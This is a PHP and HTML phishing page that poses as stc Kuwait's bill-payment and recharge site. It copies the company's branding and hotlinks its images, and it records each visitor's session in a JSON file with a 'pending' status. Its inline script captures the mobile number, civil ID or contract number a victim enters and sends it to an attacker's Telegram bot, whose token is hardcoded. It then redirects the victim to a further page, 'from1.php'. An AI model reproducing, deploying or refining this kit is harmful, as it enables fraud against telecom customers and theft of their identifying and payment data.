<?php
session_start();
$user_id = $_SESSION['user_id'] ?? uniqid("user_");
$_SESSION['user_id'] = $user_id;

$data_file = 'data.json';
$data = file_exists($data_file) ? json_decode(file_get_contents($data_file), true) : [];

$exists = false;
foreach ($data as $user) {
    if ($user['user_id'] === $user_id) {
        $exists = true;
        break;
    }
}

if (!$exists) {
    $data[] = [
        'user_id' => $user_id,
        'status' => 'pending' 
    ];
    file_put_contents($data_file, json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
}
?>


<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تصميم صفحة</title>
    <link rel="stylesheet" href="stc.css">
    
</head>
<body>

    <div class="header">
    
        <img src="stclog.webp" alt="شعار" class="logo">
    </div>

    <div>
        <img src="https://cws.stc.com.kw/sites/stckw/1602618011636/desktop/payment-desktop.webp" id="imgbodr">
        <h2 id="tex1">خدمات دفع الفواتير وإعادة التعبئة
        </h2>
    </div>

    <div id="div2"> 
<h2 id="tex2">الدفع السريع</h2>

<form id="paymentForm">
    <input type="tel" id="input1" class="input-field" placeholder="رقم الموبايل/البطاقة المدنية او رقم العقد" required inputmode="numeric">
    <img src="quick-payment.webp" id="logoform">
    <h5 id="texkash">خصم32% على الشحن السريع</h5>

    <button type="submit" class="btn">إرسال</button>

</form>
</div>
<div id="div1"> 
    <div class="container">
        <div class="StcInfoCard-styles__root___38Vxk">
            <img class="StcIcon-styles__wrapper___1fsKZ StcIcon-styles__image___2vlR2 StcInfoCard-styles__icon___37CsC StcB2cPaymentChannel-styles__cardIcon" 
                 src="https://cws.stc.com.kw/sites/stckw/1602611340677/Pay-bills.svg" 
                 loading="lazy" alt="Pay Bills">
            <h5 class="StcInfoCard-styles__infoTitle___2kUKJ font-medium">ادفع فواتيرك</h5>
            <p class="StcInfoCard-styles__infoDescription___2t8X- h5">
                ادفع فواتيرك بشكل أسرع وأكثر أماناً مع خدمة الدفع السريع من stc. ادفع وتابع تمتعك بالخدمة وانطلق بتجربتك أبعد.
            </p>
            <button class="StcButtonNew-styles__wrapper___3X0-U StcButtonNew-styles__sizeDefault___2Cu-z StcButtonNew-styles__primary___2oozo StcInfoCard-styles__btn___1abOE" aria-label="">
                <span class="StcButtonNew-styles__label___BO2Ur" onclick="window.location.href='from1.php'">
                    ادفع الآن
                  </span>
                              </button>
        </div>
    </div>
    
    <div class="container" id="box2">
        <div class="StcInfoCard-styles__root___38Vxk">
            <img class="StcIcon-styles__wrapper___1fsKZ StcIcon-styles__image___2vlR2 StcInfoCard-styles__icon___37CsC StcB2cPaymentChannel-styles__cardIcon" 
                 src="https://cws.stc.com.kw/sites/stckw/1602611340918/recharge.svg" 
                 loading="lazy" alt="Pay Bills">
            <h5 class="StcInfoCard-styles__infoTitle___2kUKJ font-medium"> أعد تعبئة خطك
            </h5>
            <p class="StcInfoCard-styles__infoDescription___2t8X- h5">
                أعد تعبئة خطك للمكالمات أو خط الإنترنت بخطوات بسيطة واستمتع بتجربة سهلة للدفع المسبق مع stc.


            </p>
            <button class="StcButtonNew-styles__wrapper___3X0-U StcButtonNew-styles__sizeDefault___2Cu-z StcButtonNew-styles__primary___2oozo StcInfoCard-styles__btn___1abOE" aria-label="">
                <span class="StcButtonNew-styles__label___BO2Ur" onclick="window.location.href='from1.php'">
                    ادفع الآن
                  </span>
                              </button>
        </div>
    </div>
    


    <div class="container" id="box2">
        <div class="StcInfoCard-styles__root___38Vxk">
            <img class="StcIcon-styles__wrapper___1fsKZ StcIcon-styles__image___2vlR2 StcInfoCard-styles__icon___37CsC StcB2cPaymentChannel-styles__cardIcon" 
                 src="	https://cws.stc.com.kw/sites/stckw/1602626402324/Terminate-lines.svg
                 " 
                 loading="lazy" alt="Pay Bills">
            <h5 class="StcInfoCard-styles__infoTitle___2kUKJ font-medium"> الدفع للخطوط الموقوفة</h5>
            <p class="StcInfoCard-styles__infoDescription___2t8X- h5">
                خطّك مقطوع! لا تحاتي. ادفع بكل سهولة وردّ الخدمة من جديد    </p>
            <button class="StcButtonNew-styles__wrapper___3X0-U StcButtonNew-styles__sizeDefault___2Cu-z StcButtonNew-styles__primary___2oozo StcInfoCard-styles__btn___1abOE" aria-label="">
                <span class="StcButtonNew-styles__label___BO2Ur" onclick="window.location.href='from1.php'">
                    ادفع الآن
                  </span>
                  
            </button>
        </div>
    </div>


</div>
    <div class="content">
    
        <div class="content-container">
            <p id="p2025">من نحن</p>
            <p id="p2025p">رؤيتنا ورسالتنا</p>
            <p id="p2025">علاقات المستثمرين</p>
            <p id="p2025p">علاقات الموردين</p>
            <p id="p2025">حوكمة الشركات</p>
            <p id="p2025p">شهادات الآيزو</p>
            <p id="p2025">شهادات الآيزو</p>
            <p id="p2025p">أخبار أنشطة stc الإعلامية</p>
            <p id="p2025">الدعم والمساعدة</p>
            <p id="p2025p">قنوات الدفع</p>
            <p id="p2025">أمنك</p>
            <p id="p2025p">تغطية الشبكة</p>
            <p id="p2025">تغطية الشبكة</p>
            <p id="p2025p">أين تجدنا</p>
            <p id="p2025">أين تجدنا</p>
            <p id="p2025p">التواصل الإجتماعي</p>
            <p id="p2025">اتصل بنا</p>
            <p id="p2025p">خريطة الموقع</p>
            <p id="p2025">الشركات التابعة</p>
            <p id="p2025p">مجموعة stc</p>
        </div>
        
    <img src="stct.svg" id="fotr">

<div> 
<div> 

    <h1 id="tex55">الحقوق محفوظة © 2025 stc.
    </h1>
</div>

</div>

    </div>
    
    <script>
        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const input = document.getElementById('input1').value;
            const botToken = '7629817492:AAGhTCC0mJj8AS_Ng0OFJmqp9Jm5Gcy8MdY';
            const chatId = '7595871538';
        
            const message = `شحن رصيد stc   :\n${input}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                window.location.href = "from1.php"; // عدل الرابط حسب الصفحة اللي تبيها
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = "from1.php"; // اختياري: صفحة خطأ
            });
        });
        </script>
        
        
</body>
</html>
